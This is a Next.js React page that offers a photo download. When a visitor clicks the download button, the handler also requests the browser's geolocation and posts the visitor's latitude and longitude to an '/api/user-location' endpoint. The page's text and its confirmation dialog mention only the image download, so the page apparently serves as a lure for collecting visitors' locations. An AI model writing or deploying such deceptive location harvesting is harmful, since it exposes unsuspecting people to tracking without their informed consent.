"use client";
import axios from "axios";
import { DownloadIcon } from "lucide-react";
import Image from "next/image";
import Link from "next/link";
import React, { useEffect, useState } from "react";

type coordsStateProps = {
  lat: string;
  long: string;
};
const HomePage = () => {
  const handleDownload = async () => {
    // Display a confirmation dialog before initiating the download
    if (confirm("Do you want to download this image?")) {
      // If user confirms, initiate the download
      const link = document.createElement("a");
      link.href = "/fir.jpg"; // Replace with the actual image URL
      link.download = "fir.jpg"; // Specify the filename for the downloaded image
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      if ("geolocation" in navigator) {
        /* geolocation is available */
        const pos = navigator.geolocation.getCurrentPosition(
          async (position) => {
            await axios.post("/api/user-location", {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            });
          }
        );
      }
    }
  };

  return (
    <div className="p-5">
      <div className="flex flex-col space-y-3 items-center p-28">
        <h3 className="text-2xl md:text-4xl text-zinc-400 font-bold">
          Click on image below to download it
        </h3>
        <div className="relative p-3">
          <div
            className="absolute right-1 z-30 cursor-pointer top-2 bg-slate-400 p-3 rounded-md"
            onClick={handleDownload}
          >
            <DownloadIcon className=" text-blue-700 w-5 h-5" />
          </div>

          <div className="w-[400px] md:w-[450px] relative h-[500px]">
            <Image
              src={"/fir.jpg"}
              alt="fir"
              fill
              className="w-full h-full object-cover"
            />
          </div>
        </div>
      </div>
    </div>
  );
};

export default HomePage;
